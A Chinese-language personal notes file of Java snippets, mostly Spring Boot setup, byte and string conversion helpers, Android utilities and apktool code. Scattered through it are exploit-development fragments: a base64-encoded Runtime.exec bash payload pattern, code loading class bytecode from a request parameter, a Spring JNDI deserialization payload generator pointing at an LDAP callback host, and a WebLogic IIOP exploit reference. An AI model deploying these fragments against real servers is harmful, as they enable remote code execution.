### 文件读写
https://github.com/shadowsock5/AWS-test/blob/main/src/main/java/example/TestRead.java

### 给项目添加swagger和spring actuator
```xml
        <!-- 使用Spring Boot Actuator监控应用, 参考：https://kucw.github.io/blog/2020/7/spring-actuator/ -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-actuator</artifactId>
        </dependency>

        <!-- 参考：https://github.com/SpringForAll/spring-boot-starter-swagger -->
        <dependency>
            <groupId>com.spring4all</groupId>
            <artifactId>swagger-spring-boot-starter</artifactId>
            <version>1.9.1.RELEASE</version>
        </dependency>
```
swagger需要给Application类添加注释：
```java
import com.spring4all.swagger.EnableSwagger2Doc;

@EnableSwagger2Doc
```

### Spring Boot添加Eureka
首先有个Eureka Server，新建一个Spring Boot项目，然后给这个class添加`@EnableEurekaServer`这个注解：
```java
package com.cqq.springdemo;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;

@SpringBootApplication
// 参考：https://cloud.spring.io/spring-cloud-netflix/multi/multi_spring-cloud-eureka-server.html
@EnableEurekaServer
public class SpringDemoApplication {

    public static void main(String[] args) {
        SpringApplication.run(SpringDemoApplication.class, args);
    }

}
```
然后添加配置文件application.yml：
```yaml
server:
  port: 8761

eureka:
  instance:
    hostname: localhost
  client:
    registerWithEureka: false
    fetchRegistry: false
    serviceUrl:
      defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/
```
在pom文件中引入依赖：
```xml
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter-netflix-eureka-server</artifactId>
        </dependency>
```


然后在另外一个Spring Boot项目里添加Client，参考：https://cloud.spring.io/spring-cloud-netflix/multi/multi__service_discovery_eureka_clients.html

```java
package org.joychou;

import com.spring4all.swagger.EnableSwagger2Doc;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.boot.web.servlet.ServletComponentScan;
import org.springframework.boot.web.support.SpringBootServletInitializer;
import org.springframework.cloud.netflix.eureka.EnableEurekaClient;


@ServletComponentScan // do filter
@SpringBootApplication
@EnableEurekaClient
public class Application extends SpringBootServletInitializer {

    @Override
    protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
        return application.sources(Application.class);
    }

    public static void main(String[] args) throws Exception {
        SpringApplication.run(Application.class, args);
    }

}
```
在pom文件中引入依赖：
```xml
        <dependency>
            <groupId>org.springframework.cloud</groupId>
            <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>
            <version>1.4.0.RELEASE</version>
        </dependency>
```
##### 判断class文件的编译版本
```
$ xxd /d/repos/test/Exploit/Exploit.class
00000000: cafe babe 0000 0032 006e 0a00 1d00 3308  .......2.n....3.
```
16进制的32对应的是10进制的50，即java 1.6


```
$ xxd /d/repos/test/Exploit/Obj.class
00000000: cafe babe 0000 0034 006f 0a00 1e00 3408  .......4.o....4.
```
16进制的34对应的是10进制的52，即java 1.8

```
$ xxd Calc.class
0000000: cafe babe 0000 0033 002f 0a00 0b00 1509  .......3./......
```
16进制的33对应的是10进制的51，即java 1.7
##### 判断操作系统执行不同的操作
```java
                String os_name = System.getProperty("os.name");
                if (os_name != null && os_name.startsWith("Windows")) {
                    logFile = new File("c:/temp/wlproxy.log");
                } else {
                    logFile = new File("/tmp/wlproxy.log");
                }
```
来源：
E:\Oracle\Middleware14.1.1.0\wlserver\modules\com.oracle.weblogic.servlet.jar!\weblogic\servlet\proxy\GenericProxyServlet.class

### Runtime.exec的命令执行shell特殊符号
#### 第一种就是对执行命令进行编码，

也就是把要执行的命令base64，然后写成这样的形式：
```bash
bash -c {echo,aXBjb25maWcgPiAvdG1wLzEudHh0}|{base64,-d}|{bash,-i}
```
在线转换地址：
http://www.jackson-t.ca/runtime-exec-payloads.html


#### 第二种是写成数组的形式
```bash
String[] command = { "/bin/sh", "-c", "echo 2333 2333 2333 && echo 2333 2333 2333" };
InputStream in = Runtime.getRuntime().exec(command).getInputStream();
```

参考：https://xz.aliyun.com/t/7046#toc-1
### 将类文件变换成base64形式
```java
    public static void test() throws Exception{
        String classFile = "D:\\repos\\dubbo_poc\\ExploitWin.class";

        byte[] bytes  = Files.readAllBytes(Paths.get(classFile));

        String value = new sun.misc.BASE64Encoder().encodeBuffer(bytes);

        System.out.println(value);
    }
```

### 将base64加密的类文件转成字节数组
```java
            String cl = request.getParameter("c");

            /* 将c参数中的类的字节码的base64解码 */
            byte[] classBytes = new sun.misc.BASE64Decoder().decodeBuffer(cl);
```


### 将byte[]写入文件
```java
(new FileOutputStream("some.class")).write(code)
```

### byte[]与String转换
```java
byte[] bytes = "hello world".getBytes();
 
//Convert byte[] to String
String s = new String(bytes);
```
参考：
https://howtodoinjava.com/java/array/convert-byte-array-string/

### byte[]转换成Hex String
```java
    /**
     * 二进制转换为十六进制
     * @param bytes byte数组
     * @return 16进制字符串
     */
    public static String binaryToHexString(byte[] bytes) {
        String hexStr = "0123456789abcdef";
        String result = "";
        String hex = "";
        for (byte b : bytes) {
            hex = String.valueOf(hexStr.charAt((b & 0xF0) >> 4));
            hex += String.valueOf(hexStr.charAt(b & 0x0F));
            result += hex + "";
        }
        return result;
    }
```

### Hex String转换成byte[]
```java
    public static byte[] hexStrToBinaryStr(String hexString) {
        hexString = hexString.replaceAll(" ", "");
        int len = hexString.length();
        int index = 0;

        byte[] bytes;
        for(bytes = new byte[len / 2]; index < len; index += 2) {
            String sub = hexString.substring(index, index + 2);
            bytes[index / 2] = (byte)Integer.parseInt(sub, 16);
        }

        return bytes;
    }
```
比如：
```
47494f50010200030000001700000002000000000000000b4e616d6553657276696365
```
转换成在Socket中发送的字节。


参考：https://github.com/0nise/CVE-2020-2551/blob/master/CVE_2020_2551.java

### char[]转换成String
```java
char[] pass;
String s_pass = String.valueOf(pass);
```

### 生成序列化对象
```java
    static void genSpringJdniPayload() throws Exception{
        String jdniAddr = "ldap://5272d7b33d98259d5e61.d.zhack.ca/LoadObject";
        JtaTransactionManager object = new JtaTransactionManager();
        object.setUserTransactionName(jdniAddr);
        File f = new File("C:\\Users\\Administrator\\Desktop\\SpringJdniPayload.ser");
        ObjectOutputStream out2 = new ObjectOutputStream(new FileOutputStream(f));
        out2.writeObject(object);
        out2.flush();
        out2.close();
    }
```

### URI彻底解码
避免因url解码导致的安全绕过问题：
```java
    public static String urlDecode(String url) {
        if (url == null) {
            return null;
        } else {
            try {
                return urlDecode(url, GeneralUtil.getCharacterEncoding());
            } catch (Exception var2) {
                log.error("Error while trying to decode URL {}", url, var2);
                return url;
            }
        }
    }

    public static String urlDecode(String url, String encoding) throws UnsupportedEncodingException {
        if (url == null) {
            return null;
        } else {
            try {
                return java.net.URLDecoder.decode(url, encoding);
            } catch (Exception var3) {
                log.error("Error while trying to decode URL {} with encoding {}", new Object[]{url, encoding, var3});
                return url;
            }
        }
    }

    public static boolean shouldUrlDecode(String text) {
        return text != null && (URL_ENCODED_STRING_PATTERN.matcher(text).find() || text.contains("+"));
    }

	// 先decode，然后判断是否需要继续decode，若是则继续，否则停止decode
    private String decodeURL(String url) {
        String decodedUri;
        for(decodedUri = HtmlUtil.urlDecode(url); HtmlUtil.shouldUrlDecode(decodedUri); decodedUri = HtmlUtil.urlDecode(decodedUri)) {
        }

        return decodedUri;
    }
```

参考：
- atlassian-confluence-7.4.10/confluence/WEB-INF/lib/confluence-7.4.10.jar!/com/atlassian/confluence/servlet/rewrite/ConfluenceResourceDownloadRewriteRule.class
- atlassian-confluence-7.4.10/confluence/WEB-INF/lib/confluence-7.4.10.jar!/com/atlassian/confluence/util/HtmlUtil.class

### 错误处理
```java
// 系统错误信息
System.err.println("Error while generating or serializing payload");
// 以某个代码退出jvm
System.exit(INTERNAL_ERROR_CODE);
```


### 用于解析HTTP Basic的凭据信息
来自：https://bitbucket.org/atlassian/confluence-webdav-plugin

```java
    protected String[] getCredentialTokens(HttpServletRequest httpServletRequest)
            throws IOException, DavException {
        String[] authorizationHeaderTokens = StringUtils.split(
                StringUtils.trim(httpServletRequest.getHeader(WebdavConstants.HEADER_AUTHORIZATION)), ' ');
        String authorizationHeader;

        if (null == authorizationHeaderTokens)
            throw new DavException(HttpServletResponse.SC_UNAUTHORIZED, "Need authentication");

        if (authorizationHeaderTokens.length < 2)
            throw new IOException("Malformed Authorization header: " + httpServletRequest.getHeader(WebdavConstants.HEADER_AUTHORIZATION));

        if (StringUtils.isBlank(authorizationHeader = authorizationHeaderTokens[1]))
            throw new IOException("Unable to read Authorization header.");

        String userNameAndPassword =
                new String(
                        Base64.decodeBase64(authorizationHeader.getBytes("UTF-8")),
                        "UTF-8"
                );
        int indexOfColon = userNameAndPassword.indexOf(':');
        if (indexOfColon > 0) {
            // User name is the start of the authorization header value till the colon index (exclusive).
            String userName = userNameAndPassword.substring(0, indexOfColon);
            // Password is colon index + 1 up until the end of the authorization header value. If the colon is at the end of the value, the password is empty.
            String password = indexOfColon < userNameAndPassword.length() - 1 ? userNameAndPassword.substring(indexOfColon + 1) : "";
            return new String[]{userName, password};
        } else {
            return new String[0];
        }
    }
```

## 替换敏感字符
这里替换掉`< & >`
```java
    public static String escape(String v) {
        if (v == null) {
            return null;
        } else {
            StringBuilder buf = new StringBuilder(v.length() + 64);

            for(int i = 0; i < v.length(); ++i) {
                char ch = v.charAt(i);
                if (ch == '<') {
                    buf.append("&lt;");
                } else if (ch == '>') {
                    buf.append("&gt;");
                } else if (ch == '&') {
                    buf.append("&amp;");
                } else {
                    buf.append(ch);
                }
            }

            if (buf.length() == v.length()) {
                return v;
            } else {
                return buf.toString();
            }
        }
    }
```

## 判断所在操作系统
```java
System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190308160735966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70)
看到大神的源码，学习一波。
## kill自己（杀掉自己所在进程）
```java
Process.killProcess(Process.myPid());
```
## 通过检查文件判断是否root
```java
    private static boolean sIsRooted() {
        for (String file : new String[]{"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"}) {
            if (new File(file).exists()) {
                return true;
            }
        }
        return false;
    }
```
## Java的shell
来自逆向Zanti的代码
```java
import java.lang.Process;
import java.lang.Runtime;

public class VirtualTerminal {
    public static VirtualTerminal a;
    public static VirtualTerminal b;
    DataOutputStream c;
    final Object d = new Object(); //供synchronized使用
    final Object e = new Object();
    # ...
    public VirtualTerminal(boolean z) {
        Process exec;
        this.k = z;
        if (z) {
            exec = Runtime.getRuntime().exec("su");
        } else {
            exec = Runtime.getRuntime().exec("sh");
        }
        synchronized (this.d) {
            this.c = new DataOutputStream(exec.getOutputStream());
            this.h = new r(this, exec.getInputStream(), this.f);
            this.i = new r(this, exec.getErrorStream(), this.g);
        }
        this.h.start();
        this.i.start();
    }
# 执行shell指令就直接VirtualTerminal.a(cmd,null);即可
    public static synchronized t a(String str, boolean z) {
        t tVar = null;
        synchronized (VirtualTerminal.class) {
            int i = 0;
            while (i < 5) {
                VirtualTerminal virtualTerminal;
                if (z) {
                    try {
                        if (a == null || a.j) {
                            a = new VirtualTerminal(z);
                        }
                        virtualTerminal = a;
                    } catch (IOException e) {
                        e.printStackTrace();
                    } catch (InterruptedException e2) {
                        e2.printStackTrace();
                    }
                } else {
                    if (b == null || b.j) {
                        b = new VirtualTerminal(z);
                    }
                    virtualTerminal = b;
                }
                tVar = a(str, virtualTerminal, null);
            }
        }
        return tVar;
        i++;
    }

```
顺带说一些某个网卡的mac地址原来是在一个文件中，是全局可读的。
```
root@NX511J:/sys/class/net/wlan0 # cat address
d8:55:a3:xx:xx:xx
root@NX511J:/sys/class/net/wlan0 # ll address
-r--r--r-- root     root         4096 2017-10-08 22:37 address
1|root@NX511J:/sys/class/net/wlan0 # cat address > /sdcard/apk/test
root@NX511J:/sys/class/net/wlan0 # ll /sdcard/apk/test
-rw-rw---- root     sdcard_r       18 2017-10-08 22:40 test
root@NX511J:/sys/class/net/wlan0 # cp address /sdcard/apk/address
root@NX511J:/sys/class/net/wlan0 # ll /sdcard/apk/address
-rw-rw---- root     sdcard_r       18 2017-10-08 22:43 address
```
但是为什么明明只有18字节，在原始目录下却显示4096呢？
## 判断某字符串是不是数字/英文/中文
```java
private static final Pattern CHINESE_PATTERN = Pattern.compile("[\\u4e00-\\u9fa5]+", 32);
    private static final Pattern ENGLISH_PATTERN = Pattern.compile("^[a-zA-Z]*", 32);
    private static final Pattern NUMBER_PATTERN = Pattern.compile("[0-9]*", 32);
public static boolean isNumeric(String str) {
     java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("[0-9]*");
     return pattern.matcher(str).matches();
}
```
## 从url加载图片
```
import android.graphics.drawable.Drawable;
import android.net.Uri;

    public static Drawable loadImageFromNetwork(String imageUrl) {
        Drawable drawable = null;
        try {
            drawable = Drawable.createFromStream(new URL(imageUrl).openStream(), "image.jpg");
        } catch (IOException e) {
            LogUtil.d("test", e.getMessage());
        }
        if (drawable == null) {
            LogUtil.d("test", "null drawable");
        } else {
            LogUtil.d("test", "not null drawable");
        }
        return drawable;
    }
```
## 判断某包是否已安装
```java
import android.content.pm.PackageInfo;
import android.content.Context;
import android.content.pm.PackageManager.NameNotFoundException;


    public static boolean isInstalledApp(Context context, String packageName) {
        PackageInfo packageInfo = null;
        try {
            packageInfo = context.getPackageManager().getPackageInfo(packageName, 16);
        } catch (NameNotFoundException e) {
            LogUtil.v("uninstall package : " + packageName);
        }
        return packageInfo != null;
    }
```
## apktool中的OS帮助类
```java
import java.io.*;
import java.util.Arrays;
import java.util.logging.Logger;

import org.apache.commons.io.IOUtils;

/**
 * @author Ryszard Wiśniewski <brut.alll@gmail.com>
 */
public class OS {

    private static final Logger LOGGER = Logger.getLogger("");

    public static void rmdir(File dir) throws BrutException {
        if (! dir.exists()) {
            return;
        }
        File[] files = dir.listFiles();
        for (int i = 0; i < files.length; i++) {
            File file = files[i];
            if (file.isDirectory()) {
                rmdir(file);
            } else {
                file.delete();
            }
        }
        dir.delete();
    }

    public static void rmfile(String file) throws BrutException {
    	File del = new File(file);
    	del.delete();
    }

    public static void rmdir(String dir) throws BrutException {
        rmdir(new File(dir));
    }

    public static void cpdir(File src, File dest) throws BrutException {
        dest.mkdirs();
        File[] files = src.listFiles();
        for (int i = 0; i < files.length; i++) {
            File file = files[i];
            File destFile = new File(dest.getPath() + File.separatorChar
                + file.getName());
            if (file.isDirectory()) {
                cpdir(file, destFile);
                continue;
            }
            try {
                InputStream in = new FileInputStream(file);
                OutputStream out = new FileOutputStream(destFile);
                IOUtils.copy(in, out);
                in.close();
                out.close();
            } catch (IOException ex) {
                throw new BrutException("Could not copy file: " + file, ex);
            }
        }
    }

    public static void cpdir(String src, String dest) throws BrutException {
        cpdir(new File(src), new File(dest));
    }

    public static void exec(String[] cmd) throws BrutException {
        Process ps = null;
        int exitValue = -99;
        try {
            ProcessBuilder builder = new ProcessBuilder(cmd);
            ps = builder.start();
            new StreamForwarder(ps.getErrorStream(), "ERROR").start();
            new StreamForwarder(ps.getInputStream(), "OUTPUT").start();
            exitValue = ps.waitFor();
            if (exitValue != 0)
                throw new BrutException("could not exec (exit code = " + exitValue + "): " + Arrays.toString(cmd));
        } catch (IOException ex) {
            throw new BrutException("could not exec: " + Arrays.toString(cmd), ex);
        } catch (InterruptedException ex) {
            throw new BrutException("could not exec : " + Arrays.toString(cmd), ex);
        }
    }

    public static File createTempDirectory() throws BrutException {
        try {
            File tmp = File.createTempFile("BRUT", null);
            if (!tmp.delete()) {
                throw new BrutException("Could not delete tmp file: " + tmp.getAbsolutePath());
            }
            if (!tmp.mkdir()) {
                throw new BrutException("Could not create tmp dir: " + tmp.getAbsolutePath());
            }
            return tmp;
        } catch (IOException ex) {
            throw new BrutException("Could not create tmp dir", ex);
        }
    }

    static class StreamForwarder extends Thread {

        StreamForwarder(InputStream is, String type) {
            mIn = is;
            mType = type;
        }

        @Override
        public void run() {
            try {
                BufferedReader br = new BufferedReader(new InputStreamReader(mIn));
                String line;
                while ((line = br.readLine()) != null) {
                    if (mType.equals("OUTPUT")) {
                        LOGGER.info(line);
                    } else {
                        LOGGER.warning(line);
                    }
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }

        private final InputStream mIn;
        private final String mType;
    }
}
```


### 写入文件
```java
    private static void writeToFile(String str, String fileName){
        FileWriter writer;
        try {
            writer = new FileWriter(fileName);
            writer.write(str);
            writer.flush();
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```
